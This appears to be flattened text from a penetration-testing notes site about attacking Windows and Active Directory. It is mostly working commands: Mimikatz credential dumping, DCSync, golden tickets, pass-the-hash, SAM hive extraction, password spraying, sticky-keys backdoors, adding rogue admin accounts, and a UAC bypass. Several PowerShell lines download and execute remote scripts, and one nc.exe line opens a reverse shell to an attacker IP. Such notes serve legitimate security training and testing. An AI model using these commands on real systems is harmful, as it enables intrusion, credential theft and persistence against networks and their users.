(disabled) SE_LOCK_MEMORY_NAME (enabled) SE_MANAGE_VOLUME_NAME (disabled) SE_PROF_SINGLE_PROCESS_NAME (enabled) SE_RESTORE_NAME (disabled) SE_SECURITY_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_SYSTEM_ENVIRONMENT_NAME (disabled) SE_SYSTEMTIME_NAME (disabled) SE_TAKE_OWNERSHIP_NAME (disabled) SE_TCB_NAME (enabled) SE_UNDOCK_NAME (disabled) LocalService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx Has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard the system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session without credentials. Local Service account is not supported for the SQL Server or SQL Server Agent services. The actual name of the account is NT AUTHORITY \\ LOCAL SERVICE . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and presents anonymous credentials on the network. Can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ LocalService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the LocalService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users NetworkService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx Has more access to resources and objects than members of the Users group. Services that run as the Network Service account access network resources by using the credentials of the computer account . The actual name of the account is NT AUTHORITY \\ NETWORK SERVICE . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and acts as the computer on the network. This account can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ NetworkService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the SECURITY_NETWORK_SERVICE_RID value. Has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the NetworkService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users Convert string to little-endian: iconv - to - code UTF - 16 LE Should be done before base64 encoding for - ExecuteCommand in powershell Enumeration Tips Ref: https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ Check the policies related to Network Access Control . Whether it can be bypassed or not. Go for guest wifi . It could lead you to get inside the company network if it is not segregated. Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords. Check for misconfigurations in the systems as well as the network. At the Domain level, always look for Administrators group members instead of going just for Domain Admins . Reason being Builtin Administrators group is the superior one. Even \"Domain Admins\" group is also the member of administrators groups. Look for User Rights Assignments in the GPOs . They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights. Most of the organizations use the same image for all of their deployments . Which means they use same local admin password . Always check if same local admin account is being used in whole domain. Identify Admin Restrictions . (Logon Hours, LogonWorkstations) Decoys can be detected using this. Use Responder to collect NTLM hashes . Check SYSVOL too. ShareEnum to look for file shares. Recon IP, subnet, default gateway etc: ipconfig / all Current user name, info in current access token, SID, privs and group that current user belongs to: whoami / all Local groups on current machine: net localgroup Local administrators of current machine: net localgroup administrators Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: netstat - an Running processes with verbose mode: tasklist / V Startup programs: net start Windows services with binary paths: sc qc service OS, processor, memory, bios related info: systeminfo output . txt Scheduled jobs: schtasks / query / fo LIST / v Patches installed and figuring out if its missing important any patch: wmic qfe get Caption , Description , HotFixID , InstalledOn Domain Network Recon Mapping of IP address to its MAC address in the network: arp - a Domain: echo % USERDOMAIN % Domain controller name: echo % logonserver % List of domain users: net user / domain List of groups in the domain: net group / domain AD domain password policy: net accounts / domain Map AD trust relationships: nltest / domain_trusts Alternate Data Stream (ADS) Listing: dir / R Find Streams: \u200b get - item - path * . * - stream * Reading: \u200b powershell Get - Content - Path hm.txt - Stream root.txt Reading: get - content backup . zip - stream pass Reading: streams . exe / accepteula - s from sysinternals Services Registry entries: HKLM \\ SYSTEM \\ CurrentControlSet \\ Services View service properties: sc qc Vulnerable Service / net start Restarting: sc stop Vulnerable Service / net stop name Start: sc start Vulnerable Service / net start name Service information: Get - Service \u200b \u200b Ubiquiti UniFi Video \u200b | fl * Restart PC: shutdown / r / t 0 Change binary path: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd @ / add Disable: sc config servicename start = disabled Enable: sc config servicename start = demand Auto: sc config servicename start = auto Keep alive - When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it's not, Service Control Manager will terminates the process. Installing MSI msiexec / quiet / qn / i malicious . msi / quiet = Suppress any messages to the user during installation / qn = No GUI / i = Regular ( vs . administrative ) installation Extract ZIP Add-Type -assembly system.io.compression.filesystem ; [io.compression.zipfile] :: ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ ) View File Systems gdr - PSProvider FileSystem Access shared volume net use y : \\\\ 10 . 10 . 10 . 57 \\ c $ / user : administrator 1234 test Open password protected share net use \\\\ server \\ share / user : test testpassword start \\\\ server \\ share Auto Save Password to PowerShell reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword $passwd = ConvertTo-SecureString Welcome1! -AsPlainText -Force ; $creds = New-Object System . Management . Automation . PSCredential ( administrator $passwd ) \u200b Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.webClient).downloadString( http:// LAB IP /writeup ) -Credential $creds Permissions: whoami / priv View Permisions: cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt Grant Permissions cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt / grant Alfred : F cacls c:\\users\\Administrator\\Desktop\\root.txt / E / P Alfred : F cacls Windows utility to view / edit file permissions / E to edit ACL / P to set permissions Alfred : F to give Alfred full control of the file https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490872(v=technet.10) icacls C:\\Program Files (x86)\\Program Folder OI This folder and files CI This folder and subfolders IO The ACE does not apply to the current file / directory . No output message : This folder only ( IO )( CI ) This folder , subfolders and files ( OI )( CI )( IO ) Subfolders and files only ( CI )( IO ) Subfolders only ( OI )( IO ) Files only SSH from Windows to Attacker (Kali) Manual From Windows: plink . exe - l root - pw - R 445 : 127 . 0 . 0 . 1 : 445 10 . 10 . 14 . 8 From Attacker: netstat -ano | grep 445 winexe -U Administrator //127.0.0.1 cmd.exe Metasploit portfwd add -l 445 -p 445 -r 127 .0.0.1 use exploit/windows/smb/psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1! set RHOST 127 .0.0.1 exploit Add user and enable RDP net user hacker hacker /add net localgroup /add Administrators hacker reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f Windows file association Hashes - ps - S lsass . exe - hashdump","title":"Quick References"},{"location":"windows/windows/#bypasses","text":"ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752 If the user is a member of the Administrators group then, we can invoke IFileOperation methods to copy, move, rename, create, and delete files without any additional permissions. This is a well-known technique used by malware. https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ifileoperation While using the IFileOperation by default it doesn\u2019t ask for the UAC Popup iwr - UseBasicParsing - Uri \u200b http://10.10.1.2/FileZilla Server.exe \u200b - OutFile C:\\Users\\sysadmin\\AppData\\Local\\Temp\\FileZilla Server.exe iex ( New - Object Net . WebClient ). DownloadString ( http://\u200b10.10.1.2\u200b/Invoke-IFileOperation.ps1 ) Invoke - IFileOperation $ IFileOperation | Get - Member $ IFileOperation . RenameItem ( C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.exe , Original.exe ) $ IFileOperation . PerformOperations () $ IFileOperation . MoveItem ( \u200bC:\\Users\\sysadmin\\AppData\\Local\\Temp\\FileZilla Server.exe\u200b , \u200bC:\\Program Files (x86)\\FileZilla Server\\ , FileZilla Server.exe\u200b ) $ IFileOperation . PerformOperations ()","title":"Bypasses"},{"location":"windows/windows/#tools","text":"Patch Extractor : https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d ntdsXtract - Active Directory forensic framework: https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: HTB: Kotarak LibEseDB - library to access the Extensible Storage Engine (ESE) Database File (EDB) format: https://github.com/libyal/libesedb The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. Dump tables: esedbexport - m tables 20170721114636 _default_192 . 168 . 110 . 133 _psexec . ntdsgrab . _333512 . dit Practice: HTB: Kotarak WinEXE - remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package): https://sourceforge.net/projects/winexe/ PowerUpSQL: Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/ Bloodhound - uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify: https://github.com/BloodHoundAD/BloodHound BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http : // bloodhound . py - u USERNAME - p PASSWORD - d DOMAIN_NAME - dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound LDIFDE: Import/Export information from AD Sys Internals: https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs localrecon.cmd: Utility to generate a summary of a Windows system: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd Empire: post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: https://github.com/EmpireProject/Empire Seatbelt: C# project that performs a number of security oriented host-survey \"safety checks\": https://github.com/GhostPack/Seatbelt","title":"Tools"},{"location":"windows/windows/#mimikatz","text":"Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html General commands: privilege :: debug sekurlsa :: logonPasswords full sekurlsa :: pth / user : Administrator / domain : WOSHUB / ntlm :{ NTLM_hash } / run : cmd . exe misc :: skeleton ipconfig / all whoami / user lsadump :: lsa / inject / name : krbtgt kerbros :: golden / domain :[ Domain ] / sid :[ SID ] / rc4 :[ NTLM Hash ] / user :[ Username To Create ] / id : 500 / ptt pushd \\\\ WINSERVER01 \\ c $ cd WINDOWS \\ NTDS If WDigest is disabled: reg add HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ SecurityProviders \\ WDigest / v UseLogonCredential / t REG_DWORD / d 1 Export memory dump and use it in Mimikatz: Get - Process lsass | Out - Minidump sekurlsa :: minidump lsass_592 . dmp Using VMWare / Hibernate file: http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/ Mimikatz features: https://adsecurity.org/?page_id=1821 DCSync https://adsecurity.org/?p=1729 mimikatz lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt mimikatz lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator \"impersonates\" a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: Discovers Domain Controller in the specified domain name. Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica. It is possible that the set of updates is too large for only one response message . In those cases , multiple DSGetNCChanges requests and responses are done . This process is called replication cycle or simply cycle . When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC\u2019s which it replicates from.","title":"Mimikatz"},{"location":"windows/windows/#psexec","text":"References: https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec https://www.toshellandback.com/2017/02/11/psexec/ http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html","title":"PsExec"},{"location":"windows/windows/#important-endpoints","text":"Connection endpoints for Windows 10: https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints","title":"Important Endpoints"},{"location":"windows/windows/#registry","text":"Important Registry Locations Installed programs: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Uninstall Gain system shell at login using 5x[shift]: HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ sethc . exe with property Debugger set to cmd . exe HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ utilman . exe with property Debugger set to cmd . exe Disable macro security: Enable EDP: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f Ways to access registry cmd: cmd / c REG QUERY Powershell: Get - Item path For remote use: Enter - PSSession and inside the session use Get - Item WMI (StdRegProv) To find IDs use: https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1 $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) .Net [ Microsoft . Win32 . RegistryKey ]. getMethods () https://archive.codeplex.com/?p=psremoteregistry Tasks Recently used commands Installed apps Turn off network level auth Attach debugger to setg.exe","title":"Registry"},{"location":"windows/windows/#credentials","text":"Cheatsheet: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md Stored Credentials Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list LM hashes Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE aad3b435b51404ee AAD3B435B51404EEAAD3B435B51404EE aad3b435b51404eeaad3b435b51404ee NTLM hashes Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 8118 cb8789b3a147c790db402b016a08 ::: ( UID ):( UID NUM ):( LM HASH ):( NT HASH ):( COMMENT ):( USER HOME PATH ): Dumping hashes Cannot copy SAM when sys is in use C : \\ reg . exe save hklm \\ sam sam C : \\ reg . exe save hklm \\ security security C : \\ reg . exe save hklm \\ system system Use secretsdump.py to extract Capturing Hashes Inveigh Impacket's smbserver.py RDP Password Brute-forcing: ncrack - v - f --user administrator -P password.txt rdp://ip,CL=1 Attack Patterns Pass the Hash Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH = LM : NTML pth - winexe - U administrator % // ip cmd pth-winexe pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd LSASS DPAPI Backup Key Access to secret keys of all users in a domain (certificate, private key, etc.) Obtaining the never changing DPAPI master key In a domain setup, all master keys are required to decrypt the keys. All master keys are protected using one never renewed key. Backup key protocol can be used (tz) to get this key from DC. Skeleton Key https://www.secureworks.com/research/skeleton-key-malware-analysis Actors can use a password of their choosing to authenticate as any user. Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal. When run, Skeleton Key performs the following tasks: Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2). 6.1 (Windows 2008 R2) 6.0 (Windows Server 2008) 5.2 (Windows 2003 R2) Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication. Enumerate available processes to acquire a handle to the LSASS process. Obtain addresses for the authentication-related functions that will be patched: CDLocateCSystem \u2014 located in cryptdll.dll SamIRetrieveMultiplePrimaryCredentials \u2014 located in samsrv.dll SamIRetrievePrimaryCredentials \u2014 located in samsrv.dll Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1. Use the OpenProcess function to acquire a handle to the LSASS process. Reserve and allocate the required memory space to edit and patch the LSASS process's memory. Patch relevant functions based on the operating system: CDLocateCSystem (all compatible Windows versions) SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1)) SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1)) Skeleton Key performs the following steps to patch each function: Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory. Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead. Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations. Manipulating SID sidHistory can be used to manipulate SID and become domain admin Use SID of the DC to look ad domain admin Use DCSync to get more information Windows Version Dependent Information Windows 2000 LSASS contains Plain NTLM / LM hashes Kerberos keys, tickets, session keys, passwords (if not consumed already) Passwords encrypted in memory using 1 byte key (XOR) Key is stored in a secret structure [Tool] MimiLove (not in Mimikatz ) Windows XP/2003 WDigest provider to auth to Web/SASL/LDAP - RFC2617 Password constantly stays in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory RC4 DESx Key and IV are stored near the secret in LSASS process TsPks (CredSSP) provider can be added manually in XP Terminal server single sign on Credential delegation for terminal server/PowerShell/Double hop, etc. LiveSSP - For using live account to logon to windows Windows Vista/7 TsPkg (CredSSP support) is available by default Several passwords are constantly in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory 3DES AES Key and IV are stored near the secret in LSASS process Windows 8/8.1 Clear text domain passwords in Vault When using PIN, Picture or Fingerprint to authenticate Offline access is possible Pass the hash, over pass the hash and pass the ticket for RDP Windows 8.1 WDigest is off by default. No password in memory by default. LSA login session cache cleaner Restricted admin mode for RDP Avoid credentials from getting sent to server Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP) LSA protection LSASS is a protected process. No memory access provided. Can be bypassed by: A driver Another protected process Protected Users security group No NTLM, WDigest, CredSSP, delegation or SSO Strengthen eKerberos only KB2975625 - Restricted admin is disabled by default Windows 10 VMS introduce for enterprise users Use Crypto HSM approach When Windows Credential Guard is enabled: NTLM hash of the password stored in the memory in \"secure world\", encrypted with a \"session-key\". User will get a blob. When authenticating, user sends the blob with NTLM challenge. Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world. In Kerberos, process is same (secure-world maintain more keys) Limitations TGS session key is not protected (TGT is protected) Not available in VMs and not enabled by default More to protect: DPAPI SAM / DSRM PAC signature References Extracting User Password Data with Mimikatz DCSync: https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/","title":"Credentials"},{"location":"windows/windows/#using-credentials","text":"References https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Password Spraying auxiliary / scanner / smb / smb_login Send the same credentials to all hosts listening on 445 - msf auxiliary ( smb_login ) services - p 445 - R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\ machine - name / user : username @domainname passwords dir \\\\ machine - name \\ c $ net use Can be detected by using net session Can terminate all session with net use / delete * Some commands, such as net view use the login user-name. .: use runas runas / netonly / user : user @domainname cmd.exe net view \\\\ machine - name / all Verify it uses Kerberos by klist Get shells psexec PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software auxiliary / admin / smb / psexec auxiliary / admin / smb / psexec_comman psexec.py - https://github.com/CoreSecurity/impacket / opt / impacket / examples / psexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 9 e730375b7cbcebf74ae46481e07b0c7 - target - ip 10 . 10 . 10 . 10 \\\\ machinename - u user @domainname - p password cmd . exe - s to get SYSTEM shell Use runas to use Kerberos TGT and avoid giving password: runas / netonly / user : user @domainname PsExec . exe \\\\ machinename - u user @domainname cmd . exe Manual Operation Copy a binary to the ADMIN$ share over SMB ( C : \\ Windows \\ PSEXECSVC . exe . ) - copy example . exe \\\\ machine \\ ADMIN $ Create a service on the remote matching pointing to the binary - sc \\\\ machine create serviceName binPath = c:\\Windows\\example.exe Remotely start the service - sc \\\\ machine start serviceName When exited, stop the service and delete the binary - del \\\\ machine \\ ADMIN $\\ example . exe smbexec.pp Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Creates a log entry for each command. Use Metasploit web_delivery to send script sc \\\\ machine create serviceName binPath = powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring( http://10.9.122.8:8080/AZPLhG9txdFhS9n ); sc \\\\ machine start serviceName Winexe https://sourceforge.net/projects/winexe/ winexe - U Administrator // 10 . 10 . 10 . 82 cmd . exe Pass the hash pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd wmiexec.py Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). without touching disk or creating a new service. wmiexec . py administrator : password @10.10.10.10 wmic wmic computerystem list full / format : list wmic process list / format : list wmic ntdomain list / format : list wmic useraccount list / format : list wmic group list / format : list wmic sysaccount list / format : list - https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 - https://windowstech.net/wmic-commands/ - Can query remotely. - Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic / node : machinename / user : username computerystem list full / format : list - Local admins on a remote machine wmic / node : ordws01 path win32_groupuser where ( groupcomponent = win32_group.name=\\ administrators \\ ,domain=\\ ORDWS01 \\ ) - Who is logged-in: wmic / node : ordws01 path win32_loggedonuser get antecedent - Read nodes from text file: wmic / node : @workstations . txt path win32_loggedonuser get antecedent - Execute command: powershell . exe - NoP - sta - NonI - W Hidden - Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw ... truncated ... wmic / node : ordws01 / user : CSCOU \\ jarrieta path win32_process call create **empire launcher string here** - Used in: - https://github.com/samratashok/nishang - https://github.com/PowerShellMafia/PowerSploit - CrackMapExec - wmiexec.py - wmis pth-wmis pth-wmis doesn\u2019t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running. echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value Windows Remote Management (WinRM) 5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable - PSRemoting - Force Set - Item wsman : \\ localhost \\ client \\ trustedhosts * Test if target is configured for WinRM: Test - WSMan machinename Execute command: Invoke - Command - Computer ordws01 - ScriptBlock { ipconfig / all } - credential CSCOU \\ jarrieta - Command line: Enter - PSSession - Computer ordws01 - credential CSCOU \\ jarrieta Force enabling WinRM: PS C : \\ tools \\ SysinternalsSuite . \\ PsExec . exe \\\\ ordws04 - u cscou \\ jarrieta - p nastyCutt3r - h - d powershell . exe enable-psremoting -force CrackMapExec \"-x\" parameter to send commands. wmiexec.py across multiple IPs Using Remote Desktop Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect: Invoke command with credentials $ user = .\\administrator ; $ psw = 1234test ; $ secpsw = ConvertTo - SecureString $ psw - AsPlainText - Force ; $ credential = New - Object System . Management . Automation . PSCredential $ user , $ secpsw invoke-command -computername localhost -credential $ credential -scriptblock { cd C : \\ Users \\ Administrator \\ Desktop \\ ; C : \\ Users \\ Administrator \\ Desktop \\ root . exe }","title":"Using Credentials"},{"location":"windows/windows/#general-exploits","text":"","title":"General Exploits"},{"location":"windows/windows/#post-exploitation","text":"Patch level systeminfo wmic qfe get Caption , Description , HotFixID , InstalledOn User info whoami echo % USERNAME % net user net localgroup net user / domain net group / domain net group / domain Group Name Firewall netsh firewall show state netsh firewall show config Network ipconfig / all route print arp - A Scheduled Tasks schtasks / query / fo LIST / v --copy output and save in txt cat schtask . txt | grep SYSTEM\\|Task To Run | grep - B 1 SYSTEM dir % SystemRoot % \\ Tasks e.g. c:\\windows\\tasks e.g. c:\\windows\\system32\\tasks Services Check service config can be modify or not accesschk.exe /accepteula accesschk.exe -uwcqv Authenticated Users * /accepteula accesschk.exe -ucqv \\ Service Name sc qc \\ Service Name -- Get service details Check service with weak file permission for /f tokens=2 delims= = %a in ( wmic service list full^|find /i pathname ^|find /i /v system32 ) do @echo % a c:\\windows\\temp\\permissions.txt for /f eol ^=^ ^ delims ^=^ %a in (c:\\windows\\temp\\permissions.txt ) do cmd.exe /c icacls %a sc.exe sc query state= all | findstr SERVICE_NAME: Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo % i type Servicenames.txt FOR /F tokens=2 delims= %i in (Servicenames.txt) DO @echo % i services.txt FOR /F %i in (services.txt) DO @sc qc % i | findstr BINARY_PATH_NAME path.txt Unquoted Service Path wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v c:\\windows\\\\ | findstr /i /v sc query sc qc service name AlwaysInstallElevated IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated Service only available from inside netstat - ano upload plink . exe plink . exe - R remote port : 127.0.0.1 : local port root @ ipaddress Passwords in files/registry https://pentestlab.blog/tag/privilege-escalation/page/3/ cmdkey / list If there are entries, it means that we may able to runas certain user who stored his cred in windows runas / savecred / user : ACCESS \\ Administrator c:\\windows\\system32\\cmd.exe /c \\\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe SAM file %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Find findstr / si password * . txt findstr / si password * . xml findstr / si password * . ini findstr / si pass / pwd * . ini dir / s * pass * == * cred * == * vnc * == * . config * findstr / spin password * . * findstr / spin password * . * Specific credential files: Unattended ? vnc ? c : \\ sysprep . inf c : \\ sysprep \\ sysprep . xml c : \\ unattend . xml % WINDIR % \\ Panther \\ Unattend \\ Unattended . xml % WINDIR % \\ Panther \\ Unattended . xml dir / b / s unattend . xml dir / b / s web . config dir / b / s sysprep . inf dir / b / s sysprep . xml dir / b / s * pass * dir c : \\ * vnc . ini / s / b dir c : \\ * ultravnc . ini / s / b dir c : \\ / s / b | findstr / si * vnc . ini VNC reg query HKCU\\Software\\ORL\\WinVNC3\\Password reg query HKCU\\Software\\TightVNC\\Server Windows autologin reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr 